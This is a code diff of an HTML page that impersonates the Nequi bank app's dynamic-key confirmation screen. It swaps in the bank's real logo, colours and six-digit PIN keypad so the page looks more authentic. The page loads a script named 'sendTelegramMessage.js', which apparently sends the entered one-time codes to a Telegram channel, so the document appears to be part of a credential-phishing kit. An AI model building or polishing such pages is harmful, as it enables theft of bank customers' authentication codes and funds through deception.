@@ -5,57 +5,89 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Nequi - Clave Dinámica</title>
   <style>
-    * {
+    html,
+    body {
+      height: 100%;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
+    }
+
+    html {
+      background: #ffffff;
+      color: #293038;
+      scroll-behavior: smooth;
     }
 
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-      background-color: #ffffff;
-      height: 100vh;
+      line-height: 1.5;
+      font-family: Manrope, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      font-size: 16px;
       display: flex;
       flex-direction: column;
-      overflow: hidden;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    *,
+    *:before,
+    *:after {
+      box-sizing: border-box;
+    }
+
+    :root {
+      --principales-blanco: #ffffff;
+      --principales-uva: #200020;
+      --principales-uva-80: #4d334d;
+      --principales-orquidea: #da0081;
+      --principales-orquidea-10: #bc0b7d;
+      --principales-orquidea-30: #f1bfda;
+      --principales-orquidea-70: #e366a7;
+      --principales-gris-70: #6e6e6e;
+      --principales-gris-500: #646464;
+    }
+
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      margin-left: auto;
+      margin-right: auto;
+      max-width: 360px;
+      padding-left: 1rem;
+      padding-right: 1rem;
     }
 
     .header {
-      padding: 20px 20px 10px;
-      background-color: #ffffff;
-      text-align: center;
-      flex-shrink: 0;
+      display: flex;
+      justify-content: center;
+      align-content: center;
+      margin: 1.25rem 1.25rem 1.875rem;
     }
 
-    .logo-text {
-      font-size: 48px;
-      font-weight: 900;
-      color: #1a1a1a;
-      letter-spacing: -1px;
-      margin-bottom: 30px;
-    }
-
-    .logo-dot {
-      color: #ff006b;
-      font-size: 48px;
+    @media (min-width: 960px) {
+      .header {
+        margin-top: 3.5rem;
+      }
     }
 
     .title {
-      font-size: 28px;
       font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 12px;
+      font-size: 1.5rem;
+      line-height: 1.75rem;
       text-align: center;
-      padding: 0 20px;
+      color: var(--principales-uva);
+      margin: 0 0 1.5rem;
+      font-style: normal;
     }
 
-    .subtitle {
-      font-size: 16px;
-      color: #666666;
+    .dynamic-password__subtitle {
+      color: var(--principales-uva);
       text-align: center;
-      line-height: 1.5;
-      padding: 0 20px;
-      margin-bottom: 30px;
+      font-size: .875rem;
+      font-style: normal;
+      line-height: 1.25rem;
+      font-weight: 400;
+      letter-spacing: .2px;
+      margin-bottom: 1.75rem;
     }
 
     .error-alert {
@@ -63,7 +95,7 @@
       background-color: #fff5f5;
       color: #d32f2f;
       padding: 16px 20px;
-      margin: 0 20px 20px;
+      margin: 0 0 20px;
       border-radius: 8px;
       text-align: center;
       font-size: 14px;
@@ -87,140 +119,132 @@
       }
     }
 
-    .input-container {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      padding: 0 20px;
-      margin-bottom: 30px;
-      flex-shrink: 0;
-    }
-
-    .pin-input {
-      width: 50px;
-      height: 50px;
-      border: none;
-      border-bottom: 3px solid #d0d0d0;
-      text-align: center;
-      font-size: 32px;
-      font-weight: 600;
-      color: #1a1a1a;
-      background: transparent;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-
-    .pin-input:focus {
-      border-bottom-color: #ff006b;
-    }
-
-    .pin-input.filled {
-      border-bottom-color: #1a1a1a;
-    }
-
-    .pin-input.error {
-      border-bottom-color: #d32f2f;
-      animation: shake 0.4s ease;
-    }
-
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      25% { transform: translateX(-5px); }
-      75% { transform: translateX(5px); }
-    }
-
-    .keyboard-container {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-end;
-      padding: 10px 20px 30px;
-      min-height: 0;
-    }
-
-    .keyboard-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      margin-bottom: 20px;
-    }
-
-    .keyboard-row {
+    .box_numerickeypad {
+      width: 272px;
       display: flex;
       justify-content: space-around;
-      align-items: center;
-      gap: 10px;
+      margin: 0 auto;
     }
 
-    .key-btn {
-      width: 70px;
-      height: 70px;
+    .input-keypad {
       border: none;
       background: transparent;
-      font-size: 36px;
-      font-weight: 300;
-      color: #1a1a1a;
-      cursor: pointer;
-      border-radius: 50%;
-      transition: background-color 0.15s;
+    }
+
+    .code_numerickeypad {
+      width: 32px;
+      color: var(--principales-orquidea);
+      text-align: center;
+      border-bottom: 1px solid var(--principales-uva);
+      padding-bottom: 12px;
+      height: 24px;
+      font-size: 2rem;
+      font-weight: 700;
+      outline: none;
+    }
+
+    .label_numerickeypad {
+      font-size: .875rem;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 1.25rem;
+      letter-spacing: .2px;
+      color: var(--principales-orquidea);
+      padding: 16px;
+      text-align: center;
+    }
+
+    .p-card {
       display: flex;
+      flex-direction: column;
+      margin: 0 auto;
       align-items: center;
-      justify-content: center;
-      -webkit-tap-highlight-color: transparent;
-      flex-shrink: 0;
-    }
-
-    .key-btn:active {
-      background-color: #f5f5f5;
-    }
-
-    .key-btn.delete {
-      background-color: #200020;
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 18px;
-    }
-
-    .key-btn.delete svg {
+      gap: 8px;
+      background: var(--principales-blanco);
       width: 100%;
-      height: auto;
+      max-width: 320px;
+      box-shadow: none;
     }
 
-    .key-btn.delete:active {
-      background-color: #350035;
+    .p-card-body {
+      padding-bottom: 0;
+      width: 100%;
     }
 
-    .key-btn.empty {
-      visibility: hidden;
+    .p-card-content {
+      width: 100%;
+    }
+
+    .numeric_board {
+      width: 90%;
+      margin: 0 auto;
+    }
+
+    .numeric_board-row {
+      display: flex;
+      padding-bottom: 18px;
+      justify-content: space-between;
+      padding-right: 12px;
+    }
+
+    .numeric_board-row:last-child {
+      padding-bottom: 0;
+    }
+
+    .container_number {
+      color: var(--principales-uva);
+      font-size: 2.25rem;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 3rem;
+      width: 28.67px;
+      display: flex;
+      justify-content: flex-end;
+      text-align: center;
+      outline: none;
+      cursor: pointer;
+      align-items: center;
+      background: transparent;
+      border: none;
+      padding: 0;
+    }
+
+    .container_number:active {
+      opacity: 0.6;
+    }
+
+    .container_number img {
+      width: 24px;
+      height: 24px;
     }
 
     .confirm-btn {
-      width: 100%;
-      max-width: 400px;
-      margin: 0 auto;
-      padding: 16px;
-      background-color: #ff006b;
-      color: white;
-      border: none;
-      border-radius: 12px;
-      font-size: 18px;
+      background-color: var(--principales-orquidea);
+      color: #ffffff;
+      height: 48px;
       font-weight: 600;
+      width: 100%;
+      max-width: 320px;
+      border-radius: 4px;
+      border: none;
+      margin: 20px auto;
       cursor: pointer;
-      transition: opacity 0.2s;
-      flex-shrink: 0;
+      font-size: 1rem;
+      transition: background-color 0.2s;
+      display: block;
     }
 
     .confirm-btn:disabled {
-      opacity: 0.4;
+      background-color: var(--principales-orquidea-30);
       cursor: not-allowed;
     }
 
+    .confirm-btn:hover:not(:disabled) {
+      background-color: var(--principales-orquidea-70);
+    }
+
     .confirm-btn:active:not(:disabled) {
-      opacity: 0.8;
+      background-color: var(--principales-orquidea-10);
     }
 
     .validating-screen {
@@ -251,7 +275,7 @@
       width: 120px;
       height: 120px;
       margin: 0 auto 2rem;
-      background: #ff006b;
+      background: #da0081;
       border-radius: 50%;
       display: flex;
       align-items: center;
@@ -289,7 +313,7 @@
       width: 40px;
       height: 40px;
       border: 4px solid rgba(255, 255, 255, 0.1);
-      border-top-color: #FF006B;
+      border-top-color: #da0081;
       border-radius: 50%;
       animation: spin 1s linear infinite;
       margin: 0 auto;
@@ -314,60 +338,67 @@
     </div>
   </div>
 
-  <div class="header">
-    <div class="logo-text">
-      <span class="logo-dot">■</span>Nequi
+  <div class="main-container">
+    <div class="header">
+      <svg width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
+        <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
+        <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
+        <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
+        <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
+        <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
+      </svg>
     </div>
-  </div>
 
-  <h1 class="title">Confirma tu identidad</h1>
-  
-  <p class="subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+    <h1 class="title">Confirma tu identidad</h1>
 
-  <div class="error-alert" id="errorAlert">
-    ¡Ups! esa no es tu clave dinamica. Puedes consultarla dentro de la App Nequi.
-  </div>
+    <p class="dynamic-password__subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
 
-  <div class="input-container">
-    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin1">
-    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin2">
-    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin3">
-    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin4">
-    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin5">
-    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin6">
-  </div>
+    <div class="error-alert" id="errorAlert">
+      ¡Ups! esa no es tu clave dinámica. Puedes consultarla dentro de la App Nequi.
+    </div>
 
-  <div class="keyboard-container">
-    <div class="keyboard-grid">
-      <div class="keyboard-row">
-        <button class="key-btn" data-value="1">1</button>
-        <button class="key-btn" data-value="2">2</button>
-        <button class="key-btn" data-value="3">3</button>
-      </div>
-      <div class="keyboard-row">
-        <button class="key-btn" data-value="4">4</button>
-        <button class="key-btn" data-value="5">5</button>
-        <button class="key-btn" data-value="6">6</button>
-      </div>
-      <div class="keyboard-row">
-        <button class="key-btn" data-value="7">7</button>
-        <button class="key-btn" data-value="8">8</button>
-        <button class="key-btn" data-value="9">9</button>
-      </div>
-      <div class="keyboard-row">
-        <button class="key-btn empty"></button>
-        <button class="key-btn" data-value="0">0</button>
-        <button class="key-btn delete" id="deleteBtn">
-          <svg viewBox="0 0 29 27" fill="none">
-            <path fill-rule="evenodd" clip-rule="evenodd" d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="white"></path>
-            <path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-            <path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-          </svg>
-        </button>
+    <div class="p-card">
+      <div class="p-card-body">
+        <div class="p-card-content">
+          <div class="box_numerickeypad">
+            <input type="password" id="pin1" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="pin2" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="pin3" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="pin4" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="pin5" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="pin6" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+          </div>
+          <div class="label_numerickeypad"></div>
+          <div class="numeric_board">
+            <div class="numeric_board-row">
+              <button name="numeric_board_1" class="container_number" data-value="1">1</button>
+              <button name="numeric_board_2" class="container_number" data-value="2">2</button>
+              <button name="numeric_board_3" class="container_number" data-value="3">3</button>
+            </div>
+            <div class="numeric_board-row">
+              <button name="numeric_board_4" class="container_number" data-value="4">4</button>
+              <button name="numeric_board_5" class="container_number" data-value="5">5</button>
+              <button name="numeric_board_6" class="container_number" data-value="6">6</button>
+            </div>
+            <div class="numeric_board-row">
+              <button name="numeric_board_7" class="container_number" data-value="7">7</button>
+              <button name="numeric_board_8" class="container_number" data-value="8">8</button>
+              <button name="numeric_board_9" class="container_number" data-value="9">9</button>
+            </div>
+            <div class="numeric_board-row">
+              <button class="container_number" disabled></button>
+              <button name="numeric_board_0" class="container_number" data-value="0">0</button>
+              <button name="numeric_board_backspace" id="deleteBtn" class="container_number">
+                <img alt="borrar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23200020' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z'%3E%3C/path%3E%3Cline x1='18' y1='9' x2='12' y2='15'%3E%3C/line%3E%3Cline x1='12' y1='9' x2='18' y2='15'%3E%3C/line%3E%3C/svg%3E">
+              </button>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
-    
-    <button class="confirm-btn" id="confirmBtn" disabled>Confirmar</button>
+
+    <button id="confirmBtn" class="confirm-btn" disabled>Confirmar</button>
   </div>
 
   <script src="../js/sendTelegramMessage.js"></script>
@@ -392,7 +423,7 @@
         document.getElementById('pin6')
       ];
       
-      const keyButtons = document.querySelectorAll('.key-btn[data-value]');
+      const keyButtons = document.querySelectorAll('.container_number[data-value]');
       const deleteBtn = document.getElementById('deleteBtn');
       const confirmBtn = document.getElementById('confirmBtn');
       const validatingScreen = document.getElementById('validatingScreen');
@@ -407,8 +438,6 @@
             const value = btn.dataset.value;
             inputs[currentIndex].value = value;
             inputs[currentIndex].dataset.realValue = value;
-            inputs[currentIndex].classList.add('filled');
-            inputs[currentIndex].classList.remove('error');
             currentIndex++;
             
             // Ocultar mensaje de error al empezar a escribir
@@ -425,8 +454,6 @@
           currentIndex--;
           inputs[currentIndex].value = '';
           inputs[currentIndex].dataset.realValue = '';
-          inputs[currentIndex].classList.remove('filled');
-          inputs[currentIndex].classList.remove('error');
           
           checkComplete();
         }
@@ -450,8 +477,6 @@
         inputs.forEach(input => {
           input.value = '';
           input.dataset.realValue = '';
-          input.classList.remove('filled');
-          input.classList.remove('error');
         });
         currentIndex = 0;
         confirmBtn.disabled = true;
@@ -461,13 +486,6 @@
       function showError() {
         // Mostrar alerta de error
         errorAlert.classList.add('show');
-        
-        // Agregar clase de error a los inputs
-        inputs.forEach(input => {
-          if (input.value) {
-            input.classList.add('error');
-          }
-        });
         
         // Limpiar campos después de 3 segundos
         setTimeout(() => {
